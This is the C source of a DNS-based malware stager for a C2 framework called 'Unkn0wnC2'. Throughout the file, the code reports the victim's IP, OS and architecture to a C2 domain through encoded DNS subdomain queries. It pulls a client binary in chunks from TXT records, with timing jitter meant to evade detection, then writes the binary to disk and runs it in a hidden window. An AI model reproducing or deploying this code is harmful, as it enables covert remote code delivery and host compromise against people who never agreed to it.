/*
 * Unkn0wnC2 DNS Stager
 * 
 * Lightweight C stager that retrieves the full client via DNS TXT records.
 * 
 * Encoding: Base36 (not encrypted) for DNS compatibility
 * - Stager messages: Base36 encoded for DNS-safe subdomain transmission
 * - Server responses: Base36 encoded in TXT record data
 * - Client data: Base64 encoded (within base36-wrapped CHUNK messages)
 * 
 * Why Base36 instead of encryption?
 * - Keeps stager binary small (~30KB)
 * - No AES library dependency
 * - Base36 uses only 0-9, a-z (DNS-safe characters)
 * - Provides obscurity without security overhead
 * - Full client uses AES-GCM encryption for actual C2 operations
 * 
 * Protocol Flow:
 * 1. Stager sends: base36(STG|IP|OS|ARCH) via DNS subdomain query
 * 2. Server responds: base36(META|<total_chunks>) in TXT record
 * 3. Stager sends: base36(ACK|0) to request chunk 0
 * 4. Server responds: base36(CHUNK|<base64_data>) in TXT record
 * 5. Loop ACK/CHUNK for all chunks
 * 6. Stager: decode base36 → assemble base64 → decode → decompress → write → execute
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <errno.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define PLATFORM "Windows"
    #define PATH_SEP "\\"
    #define NULL_DEVICE "NUL"
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/wait.h>
    #include <sys/stat.h>
    #define PLATFORM "Linux"
    #define PATH_SEP "/"
    #define NULL_DEVICE "/dev/null"
#endif

// Debug mode - set to 0 for production to remove all output
#ifndef DEBUG_MODE
    #define DEBUG_MODE 0
#endif

#if DEBUG_MODE
    #define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...) do {} while(0)
#endif

// Configuration - these should match your server setup
#ifndef DNS_SERVER
    #define DNS_SERVER "8.8.8.8"  // Default if not set by build system
#endif
#define DNS_PORT 53
#ifndef C2_DOMAIN
    #define C2_DOMAIN "secwolf.net"  // Default if not set by build system
#endif
#define MAX_LABEL_LEN 63
#define MAX_DOMAIN_LEN 253
#define MAX_TXT_LEN 255
#define DNS_TIMEOUT 10
#define MAX_RETRIES 5
#define RETRY_DELAY_SECONDS 3  // Increased for DNS propagation

// Jitter configuration for stealth
#define MIN_CHUNK_DELAY_MS 100   // Minimum delay between chunks
#define MAX_CHUNK_DELAY_MS 500   // Maximum delay between chunks
#define CHUNKS_PER_BURST 10      // Number of chunks before longer pause
#define BURST_PAUSE_MS 2000      // Pause between bursts (2 seconds)

#define MAX_CHUNKS 10000  // Maximum chunks to support
#define CHUNK_SIZE 403  // Chunk size matching server (tested maximum for DNS infrastructure)

// DNS header structure
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;

// Base64 decoding table
static const unsigned char base64_decode_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

/*
 * Base36 encoding - encode binary data to base36 string (0-9, a-z)
 * This matches the server's base36 encoding for DNS compatibility
 */
static void base36_encode(const unsigned char *input, size_t input_len, char *output, size_t output_size) {
    // Handle empty input
    if (input_len == 0) {
        output[0] = '0';
        output[1] = '\0';
        return;
    }
    
    // Convert bytes to a large number using simple base256 to base36 conversion
    // For simplicity, we'll use a digit array approach
    unsigned char bytes[512];
    size_t bytes_len = input_len;
    
    if (bytes_len > sizeof(bytes)) {
        bytes_len = sizeof(bytes);
    }
    
    memcpy(bytes, input, bytes_len);
    
    // Calculate required output length (log36(256^n) ≈ 1.23 * n)
    size_t max_output = (bytes_len * 123) / 100 + 2;
    if (max_output > output_size) {
        max_output = output_size - 1;
    }
    
    char temp[1024];
    int temp_len = 0;
    
    // Convert to base36 using repeated division
    while (bytes_len > 0) {
        // Check if all bytes are zero
        int all_zero = 1;
        for (size_t i = 0; i < bytes_len; i++) {
            if (bytes[i] != 0) {
                all_zero = 0;
                break;
            }
        }
        if (all_zero) break;
        
        // Divide by 36
        unsigned int remainder = 0;
        for (size_t i = 0; i < bytes_len; i++) {
            unsigned int val = remainder * 256 + bytes[i];
            bytes[i] = val / 36;
            remainder = val % 36;
        }
        
        // Add digit to result
        if (temp_len < sizeof(temp) - 1) {
            if (remainder < 10) {
                temp[temp_len++] = '0' + remainder;
            } else {
                temp[temp_len++] = 'a' + (remainder - 10);
            }
        }
        
        // Remove leading zeros
        while (bytes_len > 0 && bytes[0] == 0) {
            memmove(bytes, bytes + 1, bytes_len - 1);
            bytes_len--;
        }
    }
    
    // Reverse the result
    if (temp_len == 0) {
        output[0] = '0';
        output[1] = '\0';
    } else {
        for (int i = 0; i < temp_len && i < (int)output_size - 1; i++) {
            output[i] = temp[temp_len - 1 - i];
        }
        output[temp_len < output_size ? temp_len : output_size - 1] = '\0';
    }
}

/*
 * Base36 decoding - decode base36 string to binary data
 */
static size_t base36_decode(const char *input, unsigned char *output, size_t output_size) {
    size_t input_len = strlen(input);
    if (input_len == 0) return 0;
    
    // Initialize output buffer
    unsigned char bytes[512] = {0};
    size_t bytes_len = 1;
    
    // Process each base36 digit
    for (size_t i = 0; i < input_len; i++) {
        char c = input[i];
        unsigned int digit;
        
        if (c >= '0' && c <= '9') {
            digit = c - '0';
        } else if (c >= 'a' && c <= 'z') {
            digit = c - 'a' + 10;
        } else if (c >= 'A' && c <= 'Z') {
            digit = c - 'A' + 10;
        } else {
            continue; // Skip invalid characters
        }
        
        // Multiply current value by 36 and add new digit
        unsigned int carry = digit;
        for (size_t j = 0; j < bytes_len; j++) {
            unsigned int val = bytes[j] * 36 + carry;
            bytes[j] = val & 0xFF;
            carry = val >> 8;
        }
        
        // Add carry bytes
        while (carry > 0 && bytes_len < sizeof(bytes)) {
            bytes[bytes_len++] = carry & 0xFF;
            carry >>= 8;
        }
    }
    
    // Reverse bytes (we built it backwards)
    size_t result_len = bytes_len;
    if (result_len > output_size) {
        result_len = output_size;
    }
    
    for (size_t i = 0; i < result_len; i++) {
        output[i] = bytes[bytes_len - 1 - i];
    }
    
    return result_len;
}

/*
 * Base64 decode - decode base64 string to binary
 */
static size_t base64_decode(const char *input, unsigned char *output, size_t output_size) {
    size_t input_len = strlen(input);
    size_t output_len = 0;
    uint32_t bits = 0;
    int bit_count = 0;
    
    for (size_t i = 0; i < input_len; i++) {
        unsigned char c = base64_decode_table[(unsigned char)input[i]];
        if (c == 64) {
            if (input[i] == '=') break;
            continue;
        }
        
        bits = (bits << 6) | c;
        bit_count += 6;
        
        if (bit_count >= 8) {
            if (output_len >= output_size) return 0;
            output[output_len++] = (bits >> (bit_count - 8)) & 0xFF;
            bit_count -= 8;
        }
    }
    
    return output_len;
}

/*
 * Simple zlib decompression using system zlib
 * Returns decompressed size or 0 on failure
 */
#ifdef _WIN32
// For Windows, we'll skip compression for simplicity in the stager
// The server will send uncompressed base64 if STAGER_NO_COMPRESS is detected
static size_t decompress_data(const unsigned char *compressed, size_t comp_size,
                              unsigned char **decompressed) {
    // Just copy the data - server sends uncompressed for Windows stagers
    *decompressed = malloc(comp_size);
    if (!*decompressed) return 0;
    memcpy(*decompressed, compressed, comp_size);
    return comp_size;
}
#else
#include <zlib.h>
static size_t decompress_data(const unsigned char *compressed, size_t comp_size,
                              unsigned char **decompressed) {
    // Initial buffer size estimate (10x compressed size)
    size_t decomp_size = comp_size * 10;
    *decompressed = malloc(decomp_size);
    if (!*decompressed) return 0;
    
    z_stream strm = {0};
    strm.next_in = (unsigned char *)compressed;
    strm.avail_in = comp_size;
    strm.next_out = *decompressed;
    strm.avail_out = decomp_size;
    
    // Use inflateInit2 with 16+MAX_WBITS to handle gzip format
    if (inflateInit2(&strm, 16 + MAX_WBITS) != Z_OK) {
        free(*decompressed);
        return 0;
    }
    
    int ret = inflate(&strm, Z_FINISH);
    if (ret != Z_STREAM_END) {
        inflateEnd(&strm);
        free(*decompressed);
        return 0;
    }
    
    size_t final_size = strm.total_out;
    inflateEnd(&strm);
    return final_size;
}
#endif

/*
 * Get local IP address
 */
static void get_local_ip(char *ip_buffer, size_t buffer_size) {
    strncpy(ip_buffer, "0.0.0.0", buffer_size - 1);
    ip_buffer[buffer_size - 1] = '\0';
    
#ifdef _WIN32
    char hostname[256];
    struct hostent *host;
    
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        host = gethostbyname(hostname);
        if (host && host->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
            strncpy(ip_buffer, inet_ntoa(addr), buffer_size - 1);
            ip_buffer[buffer_size - 1] = '\0';
        }
    }
#else
    // Use a simple approach: connect to external IP to find local IP
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);
        
        if (connect(sock, (struct sockaddr *)&serv, sizeof(serv)) == 0) {
            struct sockaddr_in name;
            socklen_t namelen = sizeof(name);
            if (getsockname(sock, (struct sockaddr *)&name, &namelen) == 0) {
                inet_ntop(AF_INET, &name.sin_addr, ip_buffer, buffer_size);
            }
        }
        close(sock);
    }
#endif
}

/*
 * Get system architecture
 */
static void get_arch(char *arch_buffer, size_t buffer_size) {
#ifdef _WIN32
    strncpy(arch_buffer, "x64", buffer_size - 1);
    arch_buffer[buffer_size - 1] = '\0';
#else
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        strncpy(arch_buffer, unameData.machine, buffer_size - 1);
        arch_buffer[buffer_size - 1] = '\0';
    } else {
        strncpy(arch_buffer, "unknown", buffer_size - 1);
        arch_buffer[buffer_size - 1] = '\0';
    }
#endif
}

/*
 * Encode domain name for DNS query
 * Converts "example.com" to "\x07example\x03com\x00"
 */
static size_t encode_domain_name(const char *domain, unsigned char *buffer) {
    size_t pos = 0;
    const char *start = domain;
    const char *ptr = domain;
    
    while (*ptr) {
        if (*ptr == '.') {
            size_t label_len = ptr - start;
            if (label_len > 0 && label_len <= MAX_LABEL_LEN) {
                buffer[pos++] = (unsigned char)label_len;
                memcpy(buffer + pos, start, label_len);
                pos += label_len;
            }
            start = ptr + 1;
        }
        ptr++;
    }
    
    // Last label
    size_t label_len = ptr - start;
    if (label_len > 0 && label_len <= MAX_LABEL_LEN) {
        buffer[pos++] = (unsigned char)label_len;
        memcpy(buffer + pos, start, label_len);
        pos += label_len;
    }
    
    buffer[pos++] = 0; // Null terminator
    return pos;
}

/*
 * Parse TXT record from DNS response
 * TXT records are length-prefixed strings
 */
static int parse_txt_record(const unsigned char *rdata, size_t rdlen, char *output, size_t output_size) {
    size_t pos = 0;
    size_t output_pos = 0;
    
    while (pos < rdlen) {
        unsigned char len = rdata[pos++];
        if (pos + len > rdlen || output_pos + len >= output_size) {
            break;
        }
        memcpy(output + output_pos, rdata + pos, len);
        output_pos += len;
        pos += len;
    }
    
    output[output_pos] = '\0';
    return output_pos;
}

/*
 * Skip over a domain name in DNS response (handles compression)
 */
static int skip_domain_name(const unsigned char *buffer, size_t buffer_len, size_t *offset) {
    size_t pos = *offset;
    int jumped = 0;
    
    while (pos < buffer_len) {
        unsigned char len = buffer[pos];
        
        if (len == 0) {
            *offset = pos + 1;
            return 0;
        }
        
        // Compression pointer
        if ((len & 0xC0) == 0xC0) {
            if (!jumped) {
                *offset = pos + 2;
            }
            return 0;
        }
        
        // Normal label
        pos += len + 1;
    }
    
    return -1;
}

/*
 * Get system's default DNS server
 */
static int get_system_dns(char *dns_server, size_t dns_server_size) {
#ifdef _WIN32
    // On Windows, we'll use a fallback since reading registry is complex
    // Most Windows systems can resolve through localhost or use DHCP DNS
    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
    dns_server[dns_server_size - 1] = '\0';
    return 0;
#else
    // On Linux, read /etc/resolv.conf
    FILE *resolv = fopen("/etc/resolv.conf", "r");
    if (!resolv) {
        // Fallback to common public DNS
        strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
        dns_server[dns_server_size - 1] = '\0';
        return 0;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), resolv)) {
        // Look for "nameserver" lines
        if (strncmp(line, "nameserver", 10) == 0) {
            char *ns = line + 10;
            // Skip whitespace
            while (*ns == ' ' || *ns == '\t') ns++;
            
            // Extract IP address
            int i = 0;
            while (*ns && *ns != ' ' && *ns != '\t' && *ns != '\n' && i < dns_server_size - 1) {
                dns_server[i++] = *ns++;
            }
            dns_server[i] = '\0';
            
            fclose(resolv);
            return 0;
        }
    }
    
    fclose(resolv);
    
    // No nameserver found, use fallback
    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
    dns_server[dns_server_size - 1] = '\0';
    return 0;
#endif
}

/*
 * Send DNS TXT query and receive response
 */
static int dns_query_txt(const char *domain, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in dns_addr;
    unsigned char query[512];
    unsigned char answer[2048];
    size_t query_len = 0;
    char dns_server[64];
    
    // Get system's DNS server
    if (get_system_dns(dns_server, sizeof(dns_server)) != 0) {
        return -1;
    }
    
    DEBUG_PRINT("[*] dns_query_txt: %s\n", domain);
    DEBUG_PRINT("[*] Using DNS server: %s\n", dns_server);
    
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
#endif
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
#ifdef _WIN32
        WSACleanup();
#endif
        return -1;
    }
    
    DEBUG_PRINT("[*] Socket created\n");
    
    // Set receive timeout (5 seconds)
#ifdef _WIN32
    DWORD timeout = 5000; // milliseconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const void*)&tv, sizeof(tv));
#endif
    
    // Build DNS query
    dns_header_t *header = (dns_header_t *)query;
    header->id = htons((uint16_t)(time(NULL) & 0xFFFF));
    header->flags = htons(0x0100); // Standard query, recursion desired
    header->qdcount = htons(1);
    header->ancount = 0;
    header->nscount = 0;
    header->arcount = 0;
    query_len = sizeof(dns_header_t);
    
    // Encode domain name
    query_len += encode_domain_name(domain, query + query_len);
    
    // Question type (TXT = 16) and class (IN = 1)
    query[query_len++] = 0;
    query[query_len++] = 16; // TXT
    query[query_len++] = 0;
    query[query_len++] = 1;  // IN
    
    // Setup DNS server address
    memset(&dns_addr, 0, sizeof(dns_addr));
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
    
    DEBUG_PRINT("[*] Sending query to %s:%d (len=%zu)\n", dns_server, DNS_PORT, query_len);
    
    // Send query
    if (sendto(sock, (const char *)query, query_len, 0,
               (struct sockaddr *)&dns_addr, sizeof(dns_addr)) < 0) {
        DEBUG_PRINT("[!] sendto failed\n");
#ifdef _WIN32
        closesocket(sock);
        WSACleanup();
#else
        close(sock);
#endif
        return -1;
    }
    
    DEBUG_PRINT("[*] Query sent, waiting for response...\n");
    
    // Receive response
    socklen_t addr_len = sizeof(dns_addr);
    int recv_len = recvfrom(sock, (char *)answer, sizeof(answer), 0,
                           (struct sockaddr *)&dns_addr, &addr_len);
    
#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
    
    if (recv_len <= 0) {
        DEBUG_PRINT("[!] Failed to receive response (recv_len=%d)\n", recv_len);
        return -1;
    }
    
    DEBUG_PRINT("[*] Received %d bytes\n", recv_len);
    
    if (recv_len < sizeof(dns_header_t)) {
        DEBUG_PRINT("[!] Response too short: %d bytes\n", recv_len);
        return -1;
    }
    
    // Parse response header
    dns_header_t *resp_header = (dns_header_t *)answer;
    uint16_t ancount = ntohs(resp_header->ancount);
    
    DEBUG_PRINT("[*] Answer count: %d\n", ancount);
    
    if (ancount == 0) {
        DEBUG_PRINT("[!] No answers in DNS response\n");
        return -1;
    }
    
    // Skip question section
    size_t offset = sizeof(dns_header_t);
    if (skip_domain_name(answer, recv_len, &offset) < 0) {
        return -1;
    }
    offset += 4; // Skip QTYPE and QCLASS
    
    // Parse answer section
    for (int i = 0; i < ancount && offset < recv_len; i++) {
        // Skip name
        if (skip_domain_name(answer, recv_len, &offset) < 0) {
            break;
        }
        
        if (offset + 10 > recv_len) break;
        
        uint16_t type = (answer[offset] << 8) | answer[offset + 1];
        offset += 2; // Type
        offset += 2; // Class
        offset += 4; // TTL
        
        uint16_t rdlen = (answer[offset] << 8) | answer[offset + 1];
        offset += 2;
        
        if (type == 16 && offset + rdlen <= recv_len) { // TXT record
            parse_txt_record(answer + offset, rdlen, response, response_size);
            return 0;
        }
        
        offset += rdlen;
    }
    
    return -1;
}

/*
 * Send stager message via DNS TXT query
 * Encodes message with base36 for DNS compatibility
 */
static int send_dns_message(const char *message, char *response, size_t response_size) {
    char encoded[512];
    char domain[1024];
    
    // Base36 encode the message (no encryption for stager)
    base36_encode((const unsigned char *)message, strlen(message), encoded, sizeof(encoded));
    
    DEBUG_PRINT("[*] Encoded: %s (len=%zu)\n", encoded, strlen(encoded));
    
    // Retry mechanism with delays
    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
    DEBUG_PRINT("[*] DNS query attempt %d/%d\n", attempt + 1, MAX_RETRIES);
        
        // Generate fresh timestamp for each attempt (cache busting + unique per retry)
        snprintf(domain, sizeof(domain), "%s.%lu.%s", 
                 encoded, (unsigned long)time(NULL), C2_DOMAIN);
        
        DEBUG_PRINT("[*] Querying: %s\n", domain);
        
        char txt_response[4096];
        int query_result = dns_query_txt(domain, txt_response, sizeof(txt_response));
        
    DEBUG_PRINT("[*] Query result: %d\n", query_result);
        
        if (query_result == 0) {
    DEBUG_PRINT("[*] TXT response: %s\n", txt_response);
            
            // Check if this is a CHUNK response (plain text, not base36 encoded)
            if (strncmp(txt_response, "CHUNK|", 6) == 0) {
                // CHUNK responses are sent as plain text (data is already base64)
                strncpy(response, txt_response, response_size - 1);
                response[response_size - 1] = '\0';
    DEBUG_PRINT("[*] CHUNK response (plain text, %zu bytes)\n", strlen(response));
                return 0;
            }
            
            // Decode base36 response (for META and other messages)
            unsigned char decoded[4096];
            size_t decoded_len = base36_decode(txt_response, decoded, sizeof(decoded));
            
    DEBUG_PRINT("[*] Decoded length: %zu\n", decoded_len);
            
            if (decoded_len > 0 && decoded_len < response_size) {
                memcpy(response, decoded, decoded_len);
                response[decoded_len] = '\0';
    DEBUG_PRINT("[*] Final response: %s\n", response);
                return 0;
            } else if (decoded_len == 0) {
                // Maybe it's a plain text error response
                strncpy(response, txt_response, response_size - 1);
                response[response_size - 1] = '\0';
    DEBUG_PRINT("[*] Using raw response: %s\n", response);
                return 0;
            }
        }
        
        // Wait before retrying (except on last attempt)
        if (attempt < MAX_RETRIES - 1) {
    DEBUG_PRINT("[*] Waiting %d seconds before retry...\n", RETRY_DELAY_SECONDS);
#ifdef _WIN32
            Sleep(RETRY_DELAY_SECONDS * 1000);
#else
            sleep(RETRY_DELAY_SECONDS);
#endif
        }
    }
    
    return -1;
}

/*
 * Execute the downloaded client
 */
static int execute_client(const char *client_path) {
#ifdef _WIN32
    // Make executable (Windows handles this automatically)
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "\"%s\"", client_path);
    
    if (CreateProcess(NULL, cmd, NULL, NULL, FALSE,
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }
    return -1;
#else
    // Make executable
    chmod(client_path, 0755);
    
    // Fork and execute
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        // Redirect stdout/stderr to /dev/null
        freopen(NULL_DEVICE, "w", stdout);
        freopen(NULL_DEVICE, "w", stderr);
        
        execl(client_path, client_path, NULL);
        exit(1); // If exec fails
    }
    
    return (pid > 0) ? 0 : -1;
#endif
}

/*
 * Main stager function
 */
int main(int argc, char *argv[]) {
    char local_ip[64];
    char arch[32];
    char message[256];
    char response[4096];
    int total_chunks = 0;
    unsigned char **chunks = NULL;
    size_t *chunk_sizes = NULL;
    
    DEBUG_PRINT("[*] Starting stager...\n");
    
    // Get system information
    get_local_ip(local_ip, sizeof(local_ip));
    get_arch(arch, sizeof(arch));
    
    DEBUG_PRINT("[*] System info: IP=%s, OS=%s, ARCH=%s\n", local_ip, PLATFORM, arch);
    
    // Send initial stager message: STG|IP|OS|ARCH
    snprintf(message, sizeof(message), "STG|%s|%s|%s", local_ip, PLATFORM, arch);
    DEBUG_PRINT("[*] Sending: %s\n", message);
    
    if (send_dns_message(message, response, sizeof(response)) != 0) {
    DEBUG_PRINT("[!] Failed to send DNS message\n");
        return 1;
    }
    
    DEBUG_PRINT("[*] Received response: %s\n", response);
    
    // Parse metadata response: META|<total_chunks>
    if (strncmp(response, "META|", 5) != 0) {
    DEBUG_PRINT("[!] Invalid response format (expected META|)\n");
        return 1;
    }
    
    total_chunks = atoi(response + 5);
    DEBUG_PRINT("[*] Total chunks to download: %d\n", total_chunks);
    
    if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
    DEBUG_PRINT("[!] Invalid chunk count: %d\n", total_chunks);
        return 1;
    }
    
    // Allocate chunk storage
    chunks = calloc(total_chunks, sizeof(unsigned char *));
    chunk_sizes = calloc(total_chunks, sizeof(size_t));
    if (!chunks || !chunk_sizes) {
    DEBUG_PRINT("[!] Failed to allocate chunk storage\n");
        free(chunks);
        free(chunk_sizes);
        return 1;
    }
    
    // Request each chunk with jitter for stealth
    for (int i = 0; i < total_chunks; i++) {
    DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
        
        // Send ACK|<chunk_index>|<IP>|UNKN0WN (longer message with session identifier)
        snprintf(message, sizeof(message), "ACK|%d|%s|UNKN0WN", i, local_ip);
        
        if (send_dns_message(message, response, sizeof(response)) != 0) {
    DEBUG_PRINT("[!] Failed to get chunk %d\n", i);
            goto cleanup;
        }
        
        // Parse chunk response: CHUNK|<data>
        if (strncmp(response, "CHUNK|", 6) != 0) {
    DEBUG_PRINT("[!] Invalid chunk response format: %s\n", response);
            goto cleanup;
        }
        
        // Store the base64 encoded chunk
        size_t chunk_len = strlen(response + 6);
        chunks[i] = malloc(chunk_len + 1);
        if (!chunks[i]) {
            goto cleanup;
        }
        
        memcpy(chunks[i], response + 6, chunk_len + 1);
        chunk_sizes[i] = chunk_len;
        
        // Add jitter between requests to avoid detection patterns
        if (i < total_chunks - 1) {
            // Every N chunks, take a longer pause (burst control)
            if ((i + 1) % CHUNKS_PER_BURST == 0) {
#ifdef _WIN32
                Sleep(BURST_PAUSE_MS);
#else
                usleep(BURST_PAUSE_MS * 1000);
#endif
            DEBUG_PRINT("[*] Burst pause (%dms)\n", BURST_PAUSE_MS);
            } else {
                // Random jitter between min and max delay
                int delay = MIN_CHUNK_DELAY_MS + (rand() % (MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1));
#ifdef _WIN32
                Sleep(delay);
#else
                usleep(delay * 1000);
#endif
            }
        }
    }
    
    // Concatenate all base64 chunks
    size_t total_base64_size = 0;
    for (int i = 0; i < total_chunks; i++) {
        total_base64_size += chunk_sizes[i];
    }
    
    DEBUG_PRINT("[*] Total base64 data size: %zu bytes\n", total_base64_size);
    
    char *full_base64 = malloc(total_base64_size + 1);
    if (!full_base64) {
    DEBUG_PRINT("[!] Failed to allocate base64 buffer\n");
        goto cleanup;
    }
    
    size_t offset = 0;
    for (int i = 0; i < total_chunks; i++) {
        memcpy(full_base64 + offset, chunks[i], chunk_sizes[i]);
        offset += chunk_sizes[i];
    }
    full_base64[total_base64_size] = '\0';
    
    DEBUG_PRINT("[*] Decoding base64...\n");
    
    // Base64 decode
    unsigned char *compressed = malloc(total_base64_size); // Decoded will be smaller
    size_t compressed_size = base64_decode(full_base64, compressed, total_base64_size);
    free(full_base64);
    
    if (compressed_size == 0) {
    DEBUG_PRINT("[!] Base64 decode failed\n");
        free(compressed);
        goto cleanup;
    }
    
    DEBUG_PRINT("[*] Compressed size: %zu bytes\n", compressed_size);
    DEBUG_PRINT("[*] Decompressing...\n");
    
    // Decompress
    unsigned char *client_binary = NULL;
    size_t client_size = decompress_data(compressed, compressed_size, &client_binary);
    free(compressed);
    
    if (client_size == 0) {
    DEBUG_PRINT("[!] Decompression failed\n");
        goto cleanup;
    }
    
    DEBUG_PRINT("[*] Client binary size: %zu bytes\n", client_size);
    
    // Write client to disk (use /tmp on Linux for write permissions)
#ifdef _WIN32
    const char *client_filename = "client.exe";
#else
    const char *client_filename = "/tmp/client";
#endif
    
    DEBUG_PRINT("[*] Writing client to %s\n", client_filename);
    
    FILE *fp = fopen(client_filename, "wb");
    if (!fp) {
    DEBUG_PRINT("[!] Failed to open file for writing (errno: %d)\n", errno);
        free(client_binary);
        goto cleanup;
    }
    
    fwrite(client_binary, 1, client_size, fp);
    fclose(fp);
    free(client_binary);
    
#ifndef _WIN32
    // Make the client executable on Linux
    chmod(client_filename, 0755);
#endif
    
    DEBUG_PRINT("[*] Executing client...\n");
    
    // Execute client
    execute_client(client_filename);
    
    DEBUG_PRINT("[+] Stager complete!\n");
    
    // Cleanup
cleanup:
    if (chunks) {
        for (int i = 0; i < total_chunks; i++) {
            free(chunks[i]);
        }
        free(chunks);
    }
    free(chunk_sizes);
    
    return 0;
}
